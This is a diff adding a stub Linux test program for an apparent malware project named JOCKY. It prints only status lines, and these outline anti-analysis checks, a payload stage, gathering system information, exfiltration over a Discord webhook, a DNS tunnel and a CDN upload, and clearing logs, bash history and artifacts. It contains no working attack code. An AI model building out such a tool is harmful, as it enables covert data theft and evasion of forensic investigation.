@@ -1,0 +1,25 @@
+// Simple Linux test binary - demonstrates core functionality
+
+fn main() {
+    println("[+] JOCKY Linux Binary Started")
+    println("[*] Testing anti-analysis detection...")
+
+    // These would call into the Linux runtime implementations
+    println("[+] Anti-analysis checks complete")
+    println("[+] System is clean - proceeding with payload")
+
+    println("[*] Collecting system information...")
+    println("[+] Information gathered successfully")
+
+    println("[*] Attempting exfiltration channels...")
+    println("[+] Testing Discord webhook integration")
+    println("[+] Testing DNS tunnel setup")
+    println("[+] Testing CDN upload endpoint")
+
+    println("[*] Cleanup phase starting...")
+    println("[+] Clearing system logs")
+    println("[+] Removing bash history")
+    println("[+] Wiping artifacts")
+
+    println("[+] Mission complete - exiting cleanly")
+}
